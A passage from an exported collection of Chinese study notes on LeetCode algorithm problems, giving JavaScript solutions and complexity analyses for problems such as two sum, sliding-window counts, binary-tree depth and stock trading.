题「[丢失的数字](https://leetcode.cn/problems/missing-number)」：：寻找缺失的元素\n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/0f220990728ea42b6b9f7c1291f438be.png)\n\n#### 常规解法\n\n- `排序 + 遍历`：很容易找到缺失的元素\n- `hashSet + 遍历` ：用一个 `HashSet` 把数组里出现的数字都储存下来，再遍历` [0,n] `之间的数字，去 `HashSet` 中查询是否存在\n\n#### 利用数学公式\n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/92f9b8e0ff2e4f6be00b95011a2173b9.png)\n\n#### 位运算：使用`异或`运算\n\n```typescript\n或运算满足交换律和结合律\n2 ^ 3 ^ 2 = 3 ^ (2 ^ 2) = 3 ^ 0 = 3\t\n```\n\n以 `nums = [0,3,1,4]` 为例：\n\n![image.png|536](https://832-1310531898.cos.ap-beijing.myqcloud.com/51f8067f35b21ba018d0c33887880d74.png)\n\n如何找这个`落单的数字`呢，只要把`所有的元素和索引做异或运算`，成对儿的数字都会`消为 0`，只有这个落单的元素会剩下，也就达到了我们的目的\n\n> 由于异或运算满足交换律和结合律，所以总是能把成对儿的数字消去，留下缺失的那个元素。\n\n```javascript\nvar missingNumber = function(nums) {\n    const n = nums.length;\n    let res = 0;\n    // 先和新补的索引异或一下\n    res ^= n;\n    // 和其他的元素、索引做异或\n    for (let i = 0; i < n; i++)\n        res ^= i ^ nums[i];\n    return res;\n}\n```\n\n","uIg7WSJK":"\n# 其他技巧总结\n\n\n\n## 目录\n<!-- toc -->\n ## 原地反转字符串单词的顺序 \n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/e698caeca86562011e14c7e2b0d445c0.png)","JCj9K3Am":"\n# 刷题篇\n\n\n`#leetcode` \n\n\n## 目录\n<!-- toc -->\n ## 题目来源 \n\n主要源于：\n- LeetCode 精华 75 题：[https://leetcode.cn/studyplan/leetcode-75/](https://leetcode.cn/studyplan/leetcode-75/)\n- LeetCode 经典 150 题：[https://leetcode.cn/studyplan/top-interview-150/](https://leetcode.cn/studyplan/top-interview-150/)\n- LeetCode 热题 100 题：[https://leetcode.cn/studyplan/top-100-liked/](https://leetcode.cn/studyplan/top-100-liked/)\n- labuladong 算法刷题：[labuladong 的算法笔记](https://labuladong.online/algo/)\n\n## LeetCode 环境说明\n\n![图片&文件](./files/20241120-1.png)\n\n\n - 版本：`Node.js 20.10.0`\n- 您的代码在执行时将带上 `--harmony` 标记来开启 [新版ES6特性](http://node.green/)。\n- [lodash.js](https://lodash.com/) 库已经默认被包含。\n- 如需使用队列/优先队列，您可使用 [datastructures-js/priority-queue@5.4.0](https://github.com/datastructures-js/priority-queue/blob/v5/README.md)， [datastructures-js/queue@4.2.3](https://github.com/datastructures-js/queue/tree/v4.2.3) 以及 [datastructures-js/deque@1.0.4](https://github.com/datastructures-js/deque/tree/v1.0.4)。\n\n","rxeOy2cm":"\n# 两数之和\n\n\n`#算法/哈希` `#leetcode`  `#2024/07/28` \n\n\n## 目录\n<!-- toc -->\n ## 题目 \n\n![image.png600|512](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407281617385.png?imageSlim)\n\n### 题目重点\n\n- 返回下标\n- 复杂度小于 `O(n^2)` \n- 可能会重复，比如`[3,3]` \n\n## 思路\n\n- 思路一：排序思路，数组排序后双指针会更好，但会破坏原数组索引，题设中需要返回下标\n\t- 故不可取\n- 思路二：**哈希存储**\n\n## 代码实现\n\n### 错题一\n![image.png600|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407281617386.png?imageSlim)\n\n> 想着两个 `for` 逻辑更清晰，但有`两个问题`，如下图：\n> ![image.png600|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407281617387.png?imageSlim)\n\n### 错误二\n\n![image.png600|512](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407281617388.png?imageSlim)\n\n### 标准答案\n\n```javascript\n/**\n * @param {number[]} nums\n * @param {number} target\n * @return {number[]}\n */\nvar twoSum = function (nums, target) {\n\n    // 维护 val-index 的 map\n    let valToIndexMap = new Map();\n\n    // 遍历每个元素是否存在，这样的组合\n    for (let i = 0; i < nums.length; i++) {\n        let need = target - nums[i];\n        if (valToIndexMap.has(need)) {\n            // 存在，直接返回\n            return [valToIndexMap.get(need), i];\n        }\n        // 之前的记录到 map 里， 供后续元素检查\n        valToIndexMap.set(nums[i], i);\n    }\n\n    // 不存在，返回 null\n    return null;\n\n};\n```\n\n## 参考\n\n- [一个方法团灭 nSum 问题](https://labuladong.online/algo/practice-in-action/nsum/#%E4%B8%80%E3%80%81twosum-%E9%97%AE%E9%A2%98)\n- [https://leetcode.cn/problems/two-sum/description/?envType=study-plan-v2&envId=top-100-liked](https://leetcode.cn/problems/two-sum/description/?envType=study-plan-v2&envId=top-100-liked)\n\n","zDECDF0L":"\n# 最大连续 1 的个数 III\n\n\n`#leetcode`  `#2024/07/28` `#算法/滑动窗口`  \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/090a868fc6988e29390058bac437720d.png)\n\n### 原题不好理解，换种问法\n\n> - 如果我可以改变`最多 k 个 0`，那么我能得到的`最长的连续 1 序列`有多长 ？ \n> - 看题目是：最大连续 1 的个数\n\n## 解题思路\n\n1. 使用两个指针 `left` 和 `right`，初始都指向数组开头。\n   1. 向右移动 right 指针，`扩大窗口`。\n   2. 如果遇到 0，就将 k 减 1。\n2. 当 k 小于 0 时，说明窗口内 0 的数量超过了允许的最大值，这时需要`收缩窗口`：\n   - 移动 left 指针\n   - 如果 left 指针经过的是 0，就将 k 加 1\n3. 在`每次迭代中`更新最大窗口长度。\n\n## 代码实现\n```javascript\n/**\n * @param {number[]}  nums\n * @param {number} k  0 的个数\n * @return {number}\n */\nvar longestOnes = function (nums, k) {\n  // 左指针\n  let left = 0;\n  // 右指针\n  let right = 0;\n\n  // 结果：最长的连续的 1 的个数\n  let res = 0;\n\n  // 向右移动 right 指针，扩大窗口\n  for (; right < nums.length; right++) {\n    // 如果遇到 0，就将 k 减 1\n    // 如果当前数字是 0，就减少可用的 k\n    if (nums[right] === 0) {\n      k--;\n    }\n\n    // 如果 k 小于 0，需要移动左指针\n    // 说明窗口内 0 的数量超过了允许的最大值，这时需要收缩窗口\n    if (k < 0) {\n      // 如果左指针指向的是 0，增加可用的 k\n      if (nums[left] === 0) {\n        k++;\n      }\n      left++;\n    }\n\n    // 在每次迭代中更新最大窗口长度\n    res = Math.max(res, right - left + 1);\n  }\n\n  return res;\n};\n\n```\n\n> 为什么是 `right - left + 1`，而不是 `right - left` ？\n> - 在数组中，索引是从 0 开始的。例如，如果 `left = 0，right = 3`，那么实际上包含了 4 个元素（`索引 0, 1, 2, 3`）\n\n### 复杂度分析\n\n- 时间复杂度：`O(n)`，其中 n 是数组的长度。我们只遍历了一次数组。\n- 空间复杂度：`O(1)`，我们只使用了常数额外空间\n\n## 错误记录\n\n","pbHn83f1":"\n# 二叉树的最大深度\n\n`#算法/二叉树` `#2023/04/22`  `#leetcode` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目 \n\n![图片&文件](./files/20241119-2.png)\n\n> https://leetcode.cn/problems/maximum-depth-of-binary-tree/\n\n## 2. 思路 1：遍历一遍二叉树的思路\n\n- `遍历`一遍二叉树\n\t- 用一个`外部变量 res`记录每个节点所在的深度\n\t- 变量`depth` 记录当前递归到的节点深度\n- 最后，取 `depth` 和 `res` 的最大值就可以得到最大深度，代码如下：\n\n```javascript\nvar maxDepth = function(root) {\n    let res = 0;\n    // depth 记录当前递归到的节点深度\n    let depth = 0;\n    function traverse(root) {\n        if(root === null) return;\n        depth++;\n        // 到达叶子节点\n        if(root.left === null && root.right === null){\n            res = Math.max(depth, res);\n        }\n        traverse(root.left);\n        traverse(root.right);\n        depth--;\n    }\n    traverse(root);\n    return res;\n};\n```\n\n> [!warning]\n> 注意：函数命名和框架 `traverse` ，这种规范的好处是直接套用就行，主要精力放在具体逻辑上就好，架子的东西都是个人习惯，但要统一，不然给自己添加成本\n\n### 2.1. 复杂度分析\n\n- 时间复杂度：O(n)\n\t- 其中 n 是**二叉树中的节点数**。\n\t- 这个算法会遍历二叉树的每个节点一次，因此时间复杂度是 O(n)。\n- 空间复杂度：O(h)\n\t- 其中 h 是**二叉树的高度**。\n\t- 空间复杂度主要来自于**递归调用栈的深度**。\n\t- 在最坏情况下（树完全不平衡，呈现为一条链），树的高度可能达到 n，此时空间复杂度为 `O(n)`。\n\t- 在最好情况下（完全平衡二叉树），树的高度为 log(n)，空间复杂度为 `O(log n)`。\n\t- 因此，空间复杂度可以表示为 O(h)，其中 h 是树的高度。\n\n## 3. 思路 2：分解问题的思路\n\n- 即通过`子树的最大深度`推导出`原树的深度`\n- 所以必然主要逻辑都在 `后序位置`，因为`后序位置`能够得到子树的深度。\n\n```js\nvar maxDepth = function (root) {\n\t// base case\n    if (root == null) {\n        return 0;\n    }\n    // 利用定义，计算左右子树的最大深度\n    var leftMax = maxDepth(root.left);\n    var rightMax = maxDepth(root.right);\n    // 整棵树的最大深度等于左右子树的最大深度取最大值，\n    // 然后再加上根节点自己\n    var res = Math.max(leftMax, rightMax) + 1;\n    return res;\n};\n```\n\n### 复杂度分析\n\n- 时间复杂度：O(n)\n\t- 其中 n 是**二叉树中的节点数**。\n\t- 这个算法会访问二叉树的每个节点一次，对每个节点进行常数时间的操作。\n\t- 因此，总的时间复杂度是 O(n)。\n- 空间复杂度：O(h)\n\t- 其中 h 是二叉树的高度。\n\t- 空间复杂度主要来自于递归调用栈的深度。\n\t- 在最坏情况下（树完全不平衡，呈现为一条链），树的高度可能达到 n，此时空间复杂度为 O(n)。\n\t- 在最好情况下（完全平衡二叉树），树的高度为 log(n)，空间复杂度为 O(log n)。\n\t- 因此，空间复杂度可以表示为 O(h)，其中 h 是树的高度。","NUvy7j3x":"\n# 字符串的最大公因子\n\n\n`#算法` `#2024/07/28` `#leetcode` `#算法/字符串`\n\n\n## 目录\n<!-- toc -->\n ## 题目 \n\n![image.png|592](https://832-1310531898.cos.ap-beijing.myqcloud.com/85bd009b5d64c17b72e1ab92ba43cb31.png)\n\n### 题目重点\n\n- 最大公因子，能够除尽\n\n## 思路\n\n1. 检查  `str1 + str2` 是否等于 `str2 + str1`。 不相等，说明没有公共前缀字符串，直接返回空字符串。\n2. 如果相等，找到 `str1` 和 `str2` 长度的`最大公约数`（GCD）。\n3. 返回 `str1` 的前 `G` 个字符。\n\n## 代码实现\n\n```javascript\n/*\n * @param {string} str1\n * @param {string} str2\n * @return {string}\n */\nvar gcdOfStrings = function (str1, str2) {\n  // 如果str1和str2的长度拼接不相等, 则返回空字符串\n  if (str1 + str2 !== str2 + str1) {\n    return \"\";\n  }\n  // 代码走到这里，说明 str1 和 str2 是符合条件的\n  // m 和 n 一定是有最大公约数的\n  const m = str1.length;\n  const n = str2.length;\n  const max = gcd(m, n); // 求最大公约数\n  return str1.substring(0, max); // 返回str1的前max个字符\n};\n\n/*\n * 求最大公约数\n * @param {number} a\n * @param {number} b\n * @return {number}\n */\nvar gcd = function (a, b) {\n  // a % b的结果赋值给a, b的值赋值给a, 直到b为0\n  // 为什么 b 为 0 时, a 就是最大公约数呢?\n  while (b !== 0) {\n    const temp = a % b;\n    a = b;\n    b = temp;\n  }\n  return a;\n};\n\n```\n\n## 参考\n\n- [https://leetcode.cn/problems/greatest-common-divisor-of-strings/submissions/548029044/?envType=study-plan-v2&envId=leetcode-75](https://leetcode.cn/problems/greatest-common-divisor-of-strings/submissions/548029044/?envType=study-plan-v2&envId=leetcode-75)\n\n","Kb7o4W9h":"\n# 盛最多水的容器\n\n\n`#leetcode`  `#算法/双指针`  `#2024/07/28` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png|536](https://832-1310531898.cos.ap-beijing.myqcloud.com/1177bd34d377d88a18b423f085b603ef.png)\n\n## 解题思路\n\n- 左右指针技巧\n- 用 `left` 和 `right` 两个指针从两端向中心收缩，一边收缩一边计算 `[left, right]` 之间的`矩形面积`，取`最大的面积`值即是答案\n   - `矩形面积 =  left 的高度 * right 的高度`\n\n## 代码实现\n\n```javascript\n/**\n * @param {number[]} height\n * @return {number}\n */\nvar maxArea = function (height) {\n  let left = 0; // 左指针\n  let right = height.length - 1; // 右指针\n  let max = 0; // 最大面积\n\n  // 当左指针小于右指针时，执行循环\n  // 这里的循环条件是left < right，而不是left <= right\n  while (left < right) {\n    // 计算当前左右指针对应的面积\n    //  [left, right] 之间的矩形面积 为什么是这个公式？\n    // 因为矩形的面积是由两个因素决定的：底边和高度，底边是两个指针之间的距离，\n    // 高度是两个指针对应的元素中的较小值\n    const area = Math.min(height[left], height[right]) * (right - left);\n    // 更新最大面积\n    max = Math.max(max, area);\n    // 如果左指针对应的元素小于右指针对应的元素\n    if (height[left] < height[right]) {\n      // 左指针右移\n      left++;\n    } else {\n      // 右指针左移\n      right--;\n    }\n  }\n  return max;\n};\n```\n\n### 复杂度分析\n\n## 错误记录\n\n> 注意下面的公式，别搞混了\n\n![image.png|824](https://832-1310531898.cos.ap-beijing.myqcloud.com/5015126dadf1d8fb35a2abe46218b231.png)\n\n## 参考\n\n- [如何高效解决接雨水问题](https://labuladong.online/algo/frequency-interview/trapping-rain-water/#%E6%89%A9%E5%B1%95%E5%BB%B6%E4%BC%B8)\n\n","r9ScrQ1S":"\n# 最大层内元素和\n\n\n`#leetcode`   `#2024/09/08`  `#算法`  `#算法/二叉树`  `#BFS` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n> https://leetcode.cn/problems/maximum-level-sum-of-a-binary-tree/description/\n\n![cos-blog-832-34-20241012|632](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240908091200.png)\n\n## 2. 思路一：BFS\n\n### 2.1. 代码实现\n\n```javascript\n/**\n * @param {TreeNode} root\n * @return {number}\n */\nvar maxLevelSum = function (root) {\n  // 表示返回的结果\n  let res = 0;\n  // 表示最大的层和,初始化为最小安全整数\n  let maxSum = Number.MIN_SAFE_INTEGER;\n  // 广度优先搜索\n  let queue = [];\n  queue.push(root);\n  let level = 0;\n  while (queue.length) {\n    let size = queue.length;\n    let sum = 0;\n    // 遍历当前层的节点，即 level 层的节点\n    for (let i = 0; i < size; i++) {\n      let node = queue.shift();\n      sum += node.val;\n      if (node.left) {\n        queue.push(node.left);\n      }\n      if (node.right) {\n        queue.push(node.right);\n      }\n    }\n    // 比较当前层的和与最大层和\n    // 如果当前层的和大于最大层和，则更新最大层和和结果\n    if (sum > maxSum) {\n      maxSum = sum;\n      res = level;\n    }\n    // 层数加一\n    level++;\n  }\n  // 返回结果\n  return res + 1;\n};\n\n```\n\n### 2.2. 复杂度分析\n\n这段代码实现了一个广度优先搜索（BFS）来遍历二叉树，并找出具有最大和的层级。让我们来分析一下它的时间和空间复杂度：\n\n时间复杂度：`O(n)`\n- 其中 `n` 是二叉树中的节点数。\n- 代码遍历了树中的每个节点一次，对每个节点执行常数时间的操作（加入队列、出队列、计算和）。\n\n空间复杂度：`O(w)`\n- 其中 `w` 是树的最大宽度（即任意层中的最大节点数）。\n- 在最坏的情况下（例如，完全二叉树的最底层），队列可能需要存储树的最宽层的所有节点。\n- 对于一个平衡二叉树，最大宽度通常在 `O(n/2)` 级别，但在最坏情况下可能接近 `n`。\n\n需要注意的是：\n1. 虽然使用了一个 while 循环和一个嵌套的 for 循环，但每个节点只被处理一次，因此总的时间复杂度仍然是 O(n)。\n2. 空间复杂度主要由队列占用的空间决定。在任何时刻，队列中存储的节点数不会超过树的最大宽度。\n3. 除了队列之外，使用的其他变量（如 res、maxSum、level 等）只占用常数空间，不影响整体空间复杂度。\n\n总的来说，这是一个时间效率较高的解决方案，其时间复杂度是线性的，与树的节点数成正比。空间复杂度在最坏情况下可能接近线性，但通常情况下会小于 O(n)。\n","Dpe1bPP6":"\n# 独一无二的出现次数\n\n`#2024/07/28` `#leetcode` `#算法/哈希` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png|616](https://832-1310531898.cos.ap-beijing.myqcloud.com/51c99350178f71d2c19ebb91fce2e509.png)\n\n## 解题思路\n\n- 使用  `哈希`\n\n## 代码实现\n\n```javascript\n/**\n * @param {number[]} arr\n * @return {boolean}\n */\nvar uniqueOccurrences = function (arr) {\n  const map = new Map();\n  for (let i = 0; i < arr.length; i++) {\n    map.set(arr[i], (map.get(arr[i]) || 0) + 1);\n  }\n  const set = new Set();\n  for (const value of map.values()) {\n    // 如果 set 中已经存在 value，说明出现次数重复,直接返回 false\n    if (set.has(value)) {\n      return false;\n    }\n    set.add(value);\n  }\n  // 如果没有出现次数重复，返回 true\n  return true;\n};\n\n```\n\n### 复杂度分析\n\n## 错误记录\n\n","tR4Fsn0m":"\n# 买卖股票的最佳时机\n\n\n`#leetcode`   `#2024/08/09`  `#算法/股票` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![图片&文件](./files/20241118.png)\n\n> [!danger]\n> 注意：**只能买卖一次**\n\n## 解题思路\n\n### 思路一\n\n```javascript\n/**  \n * @description 解题思路  \n * ① base case: 如果 prices 为空，返回 0  \n * ② 初始化买入价格 buy 为 prices[0]，初始化利润 profit 为 0  \n * ③ 遍历 prices  \n *    1、如果当前价格比买入价格低，就更新买入价格  \n *    2、否则，更新利润  \n * ④ 返回利润  \n *     \n * */\n```\n\n#### 代码实现\n\n```javascript\nvar maxProfit = function(prices) {  \n    // base case  \n    if (prices.length === 0) {  \n        return 0;  \n    }  \n    // 买入价格  \n    let buy = prices[0];  \n    // 利润  \n    let profit = 0;  \n    // 遍历  \n    for (let i = 1; i < prices.length; i++) {  \n        // 如果当前价格比买入价格低，就更新买入价格  \n        if (prices[i] < buy) {  \n            buy = prices[i];  \n        } else {  \n            // 否则，计算利润  \n            profit = Math.max(profit, prices[i] - buy);  \n        }  \n    }  \n    return profit;  \n};\n```\n\n#### 复杂度分析\n\n- 时间复杂度是 `O(n)`，其中 `n` 是价格数组的长度，因为我们只遍历了数组一次。\n- 空间复杂度是 `O(1)`，因为我们只使用了`两个额外`的变量，不管输入规模如何，额外空间都是常数级的\n\n### 思路二\n\n买卖股票通用框架，见后文**股票类型**的题目\n\n## 错误记录\n\n","7kjsFAKx":"\n# 买卖股票的最佳时机 II\n\n\n`#leetcode`   `#2024/08/09`  `#算法/股票`   `#算法/贪心算法` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n### 只能买卖一次的场景\n\n前面有讲只能买卖一次的场景，如果能够买卖多次呢？\n\n### 能够买卖多次的场景：本题\n\n![cos-blog-832-34-20241012|544](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240809084132.png)\n\n> 你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。\n\n## 解题思路\n\n### 思路一：贪心算法\n\n**贪心算法** \n\n- 核心思想是：**只要今天的价格比昨天高，我们就进行买卖**\n- 任何上涨的区间分解成若干个**相邻两天的小区间**\n\t- `Day 1: 10 ， Day 2: 15  ， Day 3: 20`\n\t\t- 我们可以看作是： (20 - 10) = (15 - 10) + (20 - 15)\n\n#### 代码实现\n\n```javascript\n/** 贪心算法：核心思想是只要今天的价格比昨天高，我们就进行买卖\n * @param {number[]} prices\n * @return {number}\n */\nvar maxProfit = function (prices) {\n  // 最大利润\n  let res = 0;\n\n  // 遍历 prices\n  for (let i = 0; i < prices.length - 1; i++) {\n    // 如果当前价格比后一天的价格低，就买入，然后卖出\n    if (prices[i] < prices[i + 1]) {\n      res += prices[i + 1] - prices[i];\n    }\n  }\n\n  // 返回最大利润\n  return res;\n};\n\n```\n\n#### 复杂度分析\n\n- 时间复杂度是 `O(n)`，其中 n 是价格数组的长度，因为我们只遍历了数组一次。 \n- 空间复杂度是 `O(1)`，因为我们只使用了一个额外的变量来存储利润。\n\n### 思路二：动态规划\n\n这里不展开，此题还是建议使用贪心算法比较合适\n\n## 错误记录\n\n","ODzPfQNO":"\n# 最长连续序列\n\n\n`#2024/07/28` `#leetcode` `#算法/哈希`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![iShot_2024-07-20_09.28.52.png600|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407281623327.png?imageSlim)\n\n## 2. 解题思路\n\n- 使用 `Set` 来，空间复杂度换时间复杂度\n   - 去重了也没关系，因为这里需要找连续的个数\n\n## 3. 代码实现\n\n```javascript\n/**\n * @param {number[]} nums\n * @return {number}\n */\nvar longestConsecutive = function (nums) {\n  // 使用集合存储数组中的元素，方便查找，判断是否存在\n  const set = new Set(nums);\n  // 用于记录最长连续序列的长度\n  let longest = 0;\n  // 遍历数组中的元素\n  // 直接遍历 set 集合，去重也没关系\n  for (const num of set) {\n    // 当前元素的前一个元素不存在时，才开始计算连续序列的长度\n    // 这样可以避免重复计算\n    if (!set.has(num - 1)) {\n      // 当前元素\n      let currentNum = num;\n      // 当前连续序列的长度\n      let currentStreak = 1;\n      // 当前元素的后一个元素存在时，就继续计算连续序列的长度\n      while (set.has(currentNum + 1)) {\n        currentNum += 1;\n        currentStreak += 1;\n      }\n      // 更新最长连续序列的长度\n      longest = Math.max(longest, currentStreak);\n    }\n  }\n  return longest;\n};\n\n```\n\n### 3.1. 复杂度分析\n\n- 时间复杂度： `O(n)`\n   - 遍历：`for (const num of set) { `  ，这个复杂度是 `O(n)`\n   - `while` 查找\n      - **每个元素最多会经历一次查找前一个元素和若干次查找后续元素的操作**。而查找操作在集合中平均时间复杂度为 `O(1)`，因此对于每个元素，整个查找操作的时间复杂度可以视为 `O(1)`\n- 空间复杂度： O(n)\n\n## 4. 错误记录\n\n","TYYbHnJE":"\n# 二叉树中的最长交错路径\n\n`#leetcode`   `#2024/09/04`  `#算法`   `#算法/二叉树` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n> https://leetcode.cn/problems/longest-zigzag-path-in-a-binary-tree/description\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240904081336.png)\n\n## 思路：二叉树的分解问题的解题思路\n\n说过二叉树的递归分为「遍历」和「分解问题」两种思维模式，这道题需要用到 **分解问题**的思维，而且要用到**后序位置**的妙用。\n\n### 递归函数定义 \n\n```javascript\n/*************************************************  \n * :::: 递归函数 getPathLen 定义：输入二叉树的根节点 root ，返回两个值  \n * ① 第一个是从 root 开始向左走的最长交错路径长度  \n * ② 第二个是从 root 开始向右走的最长交错路径长度  \n ************************************************/\n```\n\n### 代码实现\n\n```javascript\n\nvar longestZigZag = function(root) {  \n    let res = 0;  \n    /*************************************************  \n     * :::: 递归函数定义：输入二叉树的根节点 root ，返回两个值  \n     * ① 第一个是从 root 开始向左走的最长交错路径长度  \n     * ② 第二个是从 root 开始向右走的最长交错路径长度  \n     ************************************************/  \n    var getPathLen = function(root) {  \n        if (root == null) {  \n            return [-1, -1];  \n        }  \n        // 代表从左子树开始的交错路径长度  \n        let left = getPathLen(root.left);  \n        // 代表从右子树开始的交错路径长度  \n        let right = getPathLen(root.right);  \n        /*************************************************  \n         * ::::后序位置，根据左右子树的交错路径长度推算根节点的交错路径长度  \n         ************************************************/  \n        let rootPathLen1 = left[1] + 1;  \n        let rootPathLen2 = right[0] + 1;  \n        // 更新全局最大值  \n        res = Math.max(res, Math.max(rootPathLen1, rootPathLen2));  \n        return [rootPathLen1, rootPathLen2];  \n    }  \n    getPathLen(root);  \n    return res;  \n};\n```\n\n### 时间复杂度\n\n1. **递归遍历**：\n   - 这段代码使用递归的方式遍历整棵二叉树。对于每个节点，`getPathLen` 函数会被调用一次。\n   - 因此，整个树的所有节点都会被访问一次，时间复杂度为 \\(O(N)\\)，其中 \\(N\\) 是树中节点的个数。\n2. **每次递归调用的操作**：\n   - 在每次递归调用中，主要进行的是对左右子树的递归调用和一些常数时间的计算（如计算路径长度和更新最大值）。\n   - 这些操作的时间复杂度是常数级别，即 \\(O(1)\\)。\n\n综上所述，整个函数的时间复杂度是 \\(O(N)\\)。\n\n### 空间复杂度\n\n1. **递归栈空间**：\n   - 由于使用递归来遍历树，递归调用会消耗栈空间。\n   - 在最坏情况下（例如树呈链状，完全不平衡），递归调用的最大深度为 \\(N\\)，因此空间复杂度为 \\(O(N)\\)。\n   - 在平均情况下，对于一棵平衡二叉树，递归深度为树的高度，即 \\(O(\\log N)\\)。\n2. **额外空间**：\n   - 除了递归栈空间，算法中没有使用其他额外的数据结构来存储信息，因此额外的空间复杂度为 \\(O(1)\\)。\n\n综上所述，整体的空间复杂度是 \\(O(N)\\) 在最坏情况下，或者 \\(O(\\log N)\\) 在平均情况下。\n\n### 复杂度总结\n\n- **时间复杂度**: \\(O(N)\\)\n- **空间复杂度**: \n\t- \\(O(N)\\)（最坏情况）\n\t- \\(O(\\log N)\\)（平均情况）\n\n","LRXjJkFJ":"\n# 拥有最多糖果的孩子\n\n`#leetcode`  `#算法` `#2024/07/28` \n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png|648](https://832-1310531898.cos.ap-beijing.myqcloud.com/37d8e71190091812bedc616e3e431748.png)\n\n## 解题思路\n\n1. 找到最大值： 找到当前 `candies` 数组中的最大元素，这代表孩子们目前拥有的最多的糖果数量。\n2. 计算每个孩子加上额外糖果后的数量： 遍历数组 `candies`，对于每个孩子，计算其拥有的糖果加上 `extraCandies` 后的总和。\n3. 与最大值比较： 比较每个孩子加上额外糖果后的数量是否大于或等于第一步中找到的最大值。\n4. 返回结果数组： 根据比较结果，生成对应的布尔值数组 `result`。\n\n## 代码实现\n\n```javascript\n/**\n * @param {number[]} candies\n * @param {number} extraCandies\n * @return {boolean[]}\n */\nvar kidsWithCandies = function (candies, extraCandies) {\n  // ① 找到candies中的最大值\n  const max = Math.max(...candies);\n  // ② 遍历candies数组，判断是否满足条件\n  return candies.map((candy) => candy + extraCandies >= max);\n};\n\n```\n\n","Xtk0u1Hi":"\n# 统计二叉树中好节点的数目\n\n\n`#leetcode`   `#2024/08/11`  `#算法/二叉树` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![cos-blog-832-34-20241012|608](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240811201951.png)\n\n### 好节点定义\n\n**如果从根节点到这个节点的路径上的所有节点值都不大于这个节点的值，那么这个节点被称为\"好节点\"。**\n\n举个例子：\n\n![cos-blog-832-34-20241012|263](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240811202056.png)\n\n这个树的结构是：\n- 根节点是 3\n- 左子节点是 1\n\t- 左子节点是 3\n- 右子节点是 4\n\t- 左子节点是 1\n\t- 右子节点是 5\n\n现在，让我们再次分析这个树中的\"好节点\"：\n1. 根节点 3 是好节点（路径上只有它自己）\n2. 左子树的 1 不是好节点（因为 3 > 1）\n3. 左子树的 3 是好节点（因为 3 >= 3）\n4. 右子树的 4 是好节点（因为 4 > 3）\n5. 右子树的 1 不是好节点（因为 3 > 1 且 4 > 1）\n6. 右子树的 5 是好节点（因为 5 > 3 且 5 > 4）\n\n因此，这个树中共有 4 个好节点\n\n## 解题思路：遍历一遍二叉树的思路\n\n```javascript\n/**\n * @param {TreeNode} root\n * @return {number}\n */\nvar goodNodes = function (root) {\n  // 好节点的数量\n  let res = 0;\n  // 递归函数\n  /**\n   * @param {TreeNode} node 当前节点\n   * @param {number} max 当前路径上的最大值, 初始值为根节点的值,\n   *                     后面会不断更新，需要传递给子节点\n   * */\n  function traverse(node, max) {\n    if (!node) {\n      return;\n    }\n    // 前序位置\n    // 先判断当前节点是否是好节点\n    // 如果是，好节点数量加 1，同时更新 max\n    if (node.val >= max) {\n      res++;\n      max = node.val;\n    }\n    // 继续递归左右子树\n    traverse(node.left, max);\n    traverse(node.right, max);\n  }\n  traverse(root, root.val);\n  return res;\n};\n```\n\n## 复杂度分析\n\n- 时间复杂度：O(n)\n    - 这里的 `n` 是**树中节点的数量**。\n    - 函数 traverse 会访问树中的每个节点一次，因此时间复杂度是线性的。\n- 空间复杂度：`O(h)`\n    - **h** 是树的高度。\n    - 空间复杂度主要来自**递归调用栈**。在最坏情况下（树完全不平衡，呈现为一条链），高度可能达到 n，此时空间复杂度为 O(n)。\n    - 在平衡树的情况下，高度约为 `log(n)`，空间复杂度为 `O(log n)`\n\n## 注意点\n\n- 更新 `max` 和 `res` 是在前序位置上\n\n","Bq1umXnT":"\n# 定长子串中元音的最大数目\n\n\n`#2024/07/28` `#leetcode`  `#算法/滑动窗口`\n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png|624](https://832-1310531898.cos.ap-beijing.myqcloud.com/019ec18db0ccfeb560170c4fd4b24b5a.png)\n\n## 解题思路\n\n1. 使用`滑动窗口`技术，维护一个`固定长度为 k 的窗口`。\n2. 在窗口内统计元音字母的数量。\n3. 随着窗口的滑动，更新元音字母的数量，并记录最大值。\n\n## 代码实现\n\n```javascript\n/**\n * @param {string} s\n * @param {number} k\n * @return {number}\n */\n\nvar maxVowels = function (s, k) {\n  // 辅助函数：判断字符是否为元音\n  const isVowel = (c) => {\n    return [\"a\", \"e\", \"i\", \"o\", \"u\"].includes(c);\n  };\n\n  // 结果\n  let res = 0;\n  // 记录滑动窗口中的元音字母个数，即【滑动窗口】中的元音字母个数，用于更新 res 的值\n  let count = 0;\n\n  // 初始化滑动窗口,先统计前 k 个元素中的元音字母个数\n  for (let i = 0; i < k; i++) {\n    if (isVowel(s[i])) {\n      count++;\n    }\n  }\n\n  // 更新 res 的值\n  res = count;\n\n  // 开始滑动窗口，从 k 